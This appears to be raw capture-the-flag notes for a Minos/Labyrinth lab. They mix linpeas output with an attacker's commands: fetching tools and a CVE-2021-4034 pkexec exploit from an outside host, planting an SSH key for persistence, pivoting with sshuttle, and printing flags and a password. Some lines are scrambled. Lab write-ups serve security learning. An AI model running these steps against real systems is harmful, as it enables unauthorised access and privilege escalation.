2023-07-02+19:18:21.3251911020 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cron.service/cgroup.event_control
2023-07-02+19:18:21.3224411950 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-udevd.service/cgroup.event_control
2023-07-02+19:18:21.3195303810 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-networkd.service/cgroup.event_control
2023-07-02+19:18:21.3166837370 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cgroup.event_control
ice/cgroup.event_control445490 /var/lib/lxcfs/cgroup/memory/lxc/Minos/user.sl
2023-07-02+19:18:21.3109873980 /var/lib/lxcfs/cgroup/memory/lxc/Minos/cgroup.event_control
2020-08-03+16:27:37.6875460890 /home/minos/.Website/app.py
2020-08-03+16:27:24.2715841580 /usr/local/bin/flask

╔══════════╣ Unexpected in root

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 19
drwxr-xr-x  2 root root    9 Jul 29  2020 .
drwxr-xr-x 90 root root  179 Aug 20  2020 ..
-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  825 Jul 10  2020 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/minos/.config/lxc/config.yml
/home/minos/.gnupg/pubring.kbx
/home/minos/.gnupg/trustdb.gpg
/var/log/auth.log
/var/log/syslog

logrotate 3.11.0

╔══════════╣ Files inside /home/minos (limit 20)
total 18
drwxr-xr-x 7 minos minos   14 Jul  2 19:15 .
drwxr-xr-x 3 minos minos    3 Aug  3  2020 ..
drwxr-xr-x 5 minos minos    6 Aug  3  2020 .Website
lrwxrwxrwx 1 minos minos    9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 minos minos  220 Aug  3  2020 .bash_logout
-rw-r--r-- 1 minos minos 3771 Aug  3  2020 .bashrc
drwx------ 2 minos minos    3 Aug  3  2020 .cache
drwxr-x--- 3 minos minos    3 Jul  2 19:15 .config
drwx------ 3 minos minos    9 Jul  2 19:18 .gnupg
-rw-r--r-- 1 minos minos  807 Aug  3  2020 .profile
drwx------ 2 minos minos    3 Aug  4  2020 .ssh
-rw------- 1 minos minos 7005 Aug 20  2020 .viminfo
-rw-r--r-- 1 minos minos  960 Aug 20  2020 Crete_Shores
-rw-r--r-- 1 minos minos   37 Aug  3  2020 Minos_Flag

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

��════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 1397 Jul 29  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 11755 Jul 29  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 5484 Apr 16  2018 /usr/share/nmap/scripts/http-backup-finder.nse
-rw-r--r-- 1 root root 7251 Apr 16  2018 /usr/share/nmap/scripts/http-config-backup.nse
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)

 /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 6 Jul  2 15:50 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jul  2 15:50 /run/cloud-init/.ds-identify.result

-rw-r--r-- 1 root root 1531 Aug  3  2020 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Jul 29  2020 /etc/.pwd.lock
-rw-r--r-- 1 minos minos 220 Aug  3  2020 /home/minos/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Jul 29  2020 /var/lib/landscape/.cleanup.user

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw------- 1 minos minos 22 Jul  2 19:00 /tmp/tmp.ZjVr5CnWrw
-rwxr-xr-x 1 minos minos 828098 Feb 10 20:38 /tmp/linpeas.sh
-rw-r--r-- 1 minos minos 59 Jul  2 18:43 /tmp/evilconfig.cfg
-rw-r--r-- 1 root root 51200 Aug  4  2020 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 31769 Aug  4  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 135 Jul 29  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 362 Jul 29  2020 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 3370 Aug  3  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 548804 Aug  3  2020 /var/backups/dpkg.status.0

╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/full
/dev/fuse
/dev/mqueue
/dev/net/tun
/dev/null
/dev/ptmx
/dev/random
/dev/shm
/dev/tty
#)You_can_write_even_more_files_inside_last_directory

/home
/home/minos
/run/lock
/run/screen
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/lxc/Minos/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/console-getty.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/flaskserver.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/lxd.socket/cgroup.event_control
lxc/Minos/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/lxc/Minos/user.slice/cgroup.event_control
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/python2.7/dist-packages/keyring/credentials.pyc
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
ntial-wincred.cgit/contrib/credential/wincred/git-crede
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/nmap/nselib/data/passwords.lst
/usr/share/nmap/scripts/creds-summary.nse
/usr/share/nmap/scripts/http-domino-enum-passwords.nse
/usr/share/nmap/scripts/ms-sql-empty-password.nse
/usr/share/nmap/scripts/mysql-empty-password.nse
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/Minos/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2020-08-20 14:52:59,681 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
[0mords already ran (freq=once-per-instance) config-set-passw
2023-07-02 15:50:38,929 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-07-02 15:50:38,929 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


nameserver 127.0.0.53
lxd
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -      
minos@Minos:/tmp$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.71.235.7:68          0.0.0.0:*                           -                   
udp6       0      0 fe80::216:3eff:fe8a:546 :::*                                -                   
minos@Minos:/tmp$ wget http://10.8.19.103/socat
wget http://10.8.19.103/socat
--2023-07-02 19:35:07--  http://10.8.19.103/socat
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat               100%[===================>] 366.38K   430KB/s    in 0.9s    

2023-07-02 19:35:09 (430 KB/s) - ‘socat’ saved [375176/375176]
minos@Minos:/tmp$ chmod +x socat
chmod +x socat

minos@Minos:/tmp$ ./socat tcp-l:8081,fork,reuseaddr tcp:127.0.0.53:53 &
./socat tcp-l:8081,fork,reuseaddr tcp:127.0.0.53:53 &
[1] 9647

nope

minos@Minos:/$ nmap -sn 10.10.238.0-255
nmap -sn 10.10.238.0-255

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-02 19:54 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for ip-10-10-238-88.eu-west-1.compute.internal (10.10.238.88)
Host is up (0.0011s latency).
Nmap scan report for ip-10-10-238-128.eu-west-1.compute.internal (10.10.238.128)
Host is up (0.000021s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 14.18 seconds
minos@Minos:/$ ping 10.10.238.88
ping 10.10.238.88
PING 10.10.238.88 (10.10.238.88) 56(84) bytes of data.
64 bytes from 10.10.238.88: icmp_seq=1 ttl=63 time=0.375 ms
64 bytes from 10.10.238.88: icmp_seq=2 ttl=63 time=0.738 ms
64 bytes from 10.10.238.88: icmp_seq=3 ttl=63 time=0.398 ms

minos@Minos:/$ nmap 10.10.238.88
nmap 10.10.238.88

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-02 19:58 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for ip-10-10-238-88.eu-west-1.compute.internal (10.10.238.88)
Host is up (0.0011s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
389/tcp  open  ldap
3389/tcp open  ms-wbt-server
5901/tcp open  vnc-1
6001/tcp open  X11:1
7777/tcp open  cbt
7778/tcp open  interwise

Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds

root@Minos:/root/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcGZZnZ/BkafcdrWpFJI2XZFGUS2+3KVC/gk253z9IDoaWRlH3sraR76XuhyRprJA3iN6GZITga5hE7MdkXaVyYWVQZNRvrLvOjfN+ig5lXTKs5dAal/GzkynkvrBFMgLHbzq4A9R2lOUe6s1RDnr9z+sZJGbl3ryuyW/lU8HAbfhWVqy/goIG+ddSpYraxm4Od/tlqpPesJjyFvqksp3mSTqy2740cbjkIEGsTrm0fnrZIrq8YfAi2juhoFf4vgX5APp0GbrczuErKxJjy9AmTupaFxJTi655Z3Y2zPuOnJitUunvzQEUxs1kMkIS0J+qT927KOMweiD7d1e3j64lfNQFJRHYxc0h8+h17rxqLu4SZCX64o75RInQaDP/9G4tn2hR+PGWYC3bOqDzygLgIiBMECBfYAqAqo4tz05BAc2ZAKjZ4278jLFwNJcxzTNjH358jj3xtoBtUR+x6PhXQf5ATG5siWuZn44vi+M6ZQcIOMDIqqXZ4qaO+4/ElEc= witty@kali" >> authorized_keys
<OMDIqqXZ4qaO+4/ElEc= witty@kali" >> authorized_keys

┌──(witty㉿kali)-[~/.ssh]
└─$ ssh root@10.10.0.122
Enter passphrase for key '/home/witty/.ssh/id_rsa': witty

       -""\
    .-"  .`)     (
   j   .'_+     :[                )      .^--..
  i    -"       |l                ].    /      i
 ," .:j         `8o  _,,+.,.--,   d|   `:::;    b
 i  :'|          "88p;.  (-."_"-.oP        \.   :
 ; .  (            >,%%%   f),):8"          \:'  i
i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
<  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  <
`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
 `.   `        `o`88888888b`%%%%%88< Y888P""'-    ;
   "`---`.       Y`888888888;;.,"888b."""..::::'-'
          "-....  b`8888888:::::.`8888._::-"
             `:::. `:::::O:::::::.`%%'|
              `.      "``::::::''    .'
                `.                   <
                  +:         `:   -';
                   `:         : .::/
                    ;+_  :::. :..;;;       
                    ;;;;,;;;;;;;;,;;

┌──(witty㉿kali)-[~/.ssh]
└─$ sshuttle -r root@10.10.0.122 10.10.0.0/24   
[local sudo] Password: 
Enter passphrase for key '/home/witty/.ssh/id_rsa': 
                                                    c : Connected to server.

root@Minos:/etc# ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
9: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:01:39 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.71.235.7/24 brd 10.71.235.255 scope global dynamic eth0
       valid_lft 2834sec preferred_lft 2834sec
    inet6 fd42:a113:181b:47f:216:3eff:fe8a:139/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 3183sec preferred_lft 3183sec
    inet6 fe80::216:3eff:fe8a:139/64 scope link 
       valid_lft forever preferred_lft forever
root@Minos:/etc# nmap 10.71.235.7
nmap 10.71.235.7

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-03 22:35 UTC
Nmap scan report for Minos.lxd (10.71.235.7)
Host is up (0.0000050s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds

root@Minos:/etc# curl Minos.lxd:8080
curl Minos.lxd:8080
<html>
	<head>
	</head>
	<body>
		<pre>
		King Minos of Crete was feared by all of the rulers
		of the lands around him. When he demanded offerings
		or men for his armies, all agreed to his demands.
		When he demanded they send tributes to honour him,
		they sent them without question.

		But his demands on Athens became too great.

		King Minos had constructed a great palace in Knossos.
		Inside this palace he instructed Daedalus to be the 
		architect of a great labyrinth, and, at the centre
		of the maze he kept his wife's son - The Minotaur.

		It was powerful, and savage, and would eat the flesh
		of the offerings sent into the labyrinth by King Minos.
		They would wander through the maze, completely lost, 
		until at last they came face to face with the Minotaur.

		As for Athens, Minos demanded every year the King send
		him seven young men and women. One year, he sent his son:
		Theseus.

		Before leaving, Theseus' father gave him a letter with 
		a message to help him on his way to Crete.

		On the bottom of the letter was a message Theseus didn't
		quite understand: 
	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	
	

		<img src="/static/Knossos.jpg" />
	</body>
continuing

# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.71.235.7  netmask 255.255.255.0  broadcast 10.71.235.255
        inet6 fe80::216:3eff:fe8a:139  prefixlen 64  scopeid 0x20<link>
        inet6 fd42:a113:181b:47f:216:3eff:fe8a:139  prefixlen 64  scopeid 0x0<global>
        ether 00:16:3e:8a:01:39  txqueuelen 1000  (Ethernet)
        RX packets 240  bytes 26136 (26.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 232  bytes 22258 (22.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3133  bytes 791785 (791.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3133  bytes 791785 (791.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# nmap -sn 10.71.235.255/24

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 17:10 UTC
Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
Host is up (0.000033s latency).
MAC Address: FE:46:D7:FA:E5:31 (Unknown)
Nmap scan report for Athens.lxd (10.71.235.37)
Host is up (-0.088s latency).
MAC Address: 00:16:3E:9E:36:DA (Xensource)
Nmap scan report for Labyrinth.lxd (10.71.235.159)
Host is up (-0.10s latency).
MAC Address: 00:16:3E:65:94:47 (Xensource)
Nmap scan report for Minos.lxd (10.71.235.7)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 4.81 seconds


┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.0.7 - - [20/May/2024 13:22:02] "GET /linpeas.sh HTTP/1.1" 200 -

entrance@Labyrinth:/home$ ls
ariadne  entrance  minotaur
entrance@Labyrinth:/home$ cd /tmp
entrance@Labyrinth:/tmp$ ls
systemd-private-0d01bcbdcd194c3e8200c71ab19c50b2-systemd-resolved.service-bTDT4Y
entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
--2024-05-20 17:22:01--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   461KB/s    in 1.8s    

2024-05-20 17:22:04 (461 KB/s) - ‘linpeas.sh’ saved [828098/828098]

entrance@Labyrinth:/tmp$ chmod +x linpeas.sh
entrance@Labyrinth:/tmp$ ./linpeas.sh

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)


┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ ls
CVE-2021-4034.py  LICENSE  README.md
                                                                                   
┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ tail CVE-2021-4034.py 
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)

change to (if u did Red Room)

https://github.com/joeammond/CVE-2021-4034

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ tail CVE-2021-4034.py 
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.0.7 - - [20/May/2024 13:37:30] "GET /CVE-2021-4034.py HTTP/1.1" 200 -

entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/CVE-2021-4034.py
--2024-05-20 17:37:29--  http://10.8.19.103:8000/CVE-2021-4034.py
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

CVE-2021-4034.py    100%[===================>]   3.19K  --.-KB/s    in 0s      

2024-05-20 17:37:30 (250 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]

entrance@Labyrinth:/tmp$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[-] GCONV_PATH=. directory already exists, continuing.
[-] exploit directory already exists, continuing.
[+] Calling execve()
# id
uid=0(root) gid=1001(entrance) groups=1001(entrance)

thx LSD00

root@Labyrinth:/tmp# grep -iRl "thm{" /home/* 2>/dev/null
grep -iRl "thm{" /home/* 2>/dev/null
/home/ariadne/Minotaur_Flag
/home/minotaur/Labyrinth_Flag


# cd /home
# ls
ariadne  entrance  minotaur
# cd minotaur
# ls
Labyrinth_Flag	Minotaur  ariadne  thread
# cat Labyrinth_Flag
THM{6154ea526254375613650183962bf431}
# ls
Labyrinth_Flag	Minotaur  ariadne  thread
# cd ..
# ls
ariadne  entrance  minotaur
# cd ariadne
# ls
Minotaur_Flag  TheReturn  ariadne
# cat Minotaur_Flag
THM{c307b8045208fac06b9faa90e68d2ad4}

# ls -lah
total 42K
drwxr-xr-x 4 ariadne ariadne   11 Aug 20  2020 .
drwxr-xr-x 5 root    root       5 Aug  3  2020 ..
lrwxrwxrwx 1 root    root       9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ariadne ariadne  220 Aug  3  2020 .bash_logout
-rw-r--r-- 1 ariadne ariadne 3.7K Aug  3  2020 .bashrc
drwx------ 3 ariadne ariadne    3 Aug  3  2020 .gnupg
-rw-r--r-- 1 ariadne ariadne  807 Aug  3  2020 .profile
drwx------ 2 ariadne ariadne    5 Aug  4  2020 .ssh
-rwxr----- 1 ariadne ariadne   38 Aug  3  2020 Minotaur_Flag
-rwxr----- 1 ariadne ariadne  689 Aug 20  2020 TheReturn
-rw-r--r-- 1 ariadne ariadne  30K Aug 20  2020 ariadne
# bash -i
root@Labyrinth:/home/ariadne# cat TheReturn
Despair set in and Theseus wondered
if this was where his life would end, 
down in the dark, all alone, next to
the stinking body. Then his hand brushed
a piece of string and, with a whoop
of delight, he knew he had found the
thread which would lead him back out of
the labyrinth. As he neared the entrance,
the darkness began to fade he made
out the figure of Ariadne, waiting for
his return.

"You must take me back to Athens with you!"
she cried, "My father will kill me when 
he finds out that I have helped you."

Theseus insisted she come with them, "it 
would be crule to leave you here." Quickly
and quietly, they unfurled the great black 
sails of their ship and headed for home.

root@Labyrinth:/home/ariadne# file ariadne
ariadne: data

root@Labyrinth:/home/minotaur# cat Minotaur
Theseus walked carefully through the dark, 
foul-smelling passages of the labyrinth, 
expecting any moment to come face-to-face 
with the creature. He did not have long to
wait. Turning a corner, with his hands held
out in front of him feeling his way, suddenly
he touched what felt like a huge bony horn.

In an instant his world turned upside down,
quite literally. He was picked up between the
Minotaurs horns and tossed high into the air.
When he landed on the hard cold stone, he felt
the animal's huge hooves come down on his 
chest. Every last breath seemed to be knocked
out of him and he struggled to stay alive in 
the darkness.

But Theseus the son of King Aegeus was both 
brave and stubborn. As the Minotaur bellowed
in his ear and grabbed at him, Theseus found a
strength which he did not know he possessed.

He grabbed the animal's huge horns, and kept
on twisting the great head from side to side.
As the animal grew weak, Theseus gave one almighty
wrench on the head, turning it almost the whole way,
The creature's neck snapped, it gurgled its 
last breath and fell to the floor with an
enormous thud.

It was over, he had done it. The Minotaur was
dead. All he has to do was make his way back 
out of the Labyrinth... And at that moment he
realized the awful mistake he had made. In the
struggle with the Minotaur he had dropped the 
string, his lifeline. Theseus felt all over
the floor in the pitch darkness for the string.

root@Labyrinth:/home/minotaur# file thread
thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
root@Labyrinth:/home/minotaur# cat ariadne
Username: ariadne
Password: TheLover

root@Labyrinth:/root# ls -lah
total 14K
drwx------  5 root root   10 Aug 20  2020 .
drwxr-xr-x 22 root root   22 Jul 29  2020 ..
lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root    3 Aug  3  2020 .cache
drwx------  3 root root    3 Aug  3  2020 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root    4 Aug  4  2020 .ssh
-rw-------  1 root root  12K Aug 20  2020 .viminfo
-rw-r--r--  1 root root 1.6K Aug  3  2020 maze
